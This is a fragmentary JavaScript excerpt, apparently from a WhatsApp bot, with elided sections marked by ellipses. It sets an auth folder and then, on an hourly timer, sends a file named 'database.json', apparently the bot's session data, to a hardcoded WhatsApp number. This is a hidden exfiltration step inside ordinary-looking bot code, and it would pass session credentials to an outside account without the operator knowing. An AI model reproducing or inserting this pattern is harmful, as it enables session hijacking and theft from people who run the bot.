...
const authFolder = `${opts._[0] || 'Domge'}`
...
setInterval(async () => {
    ...
    return await conn.sendMessage('6285812273035@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
  }, 60 * 60 * 1000)
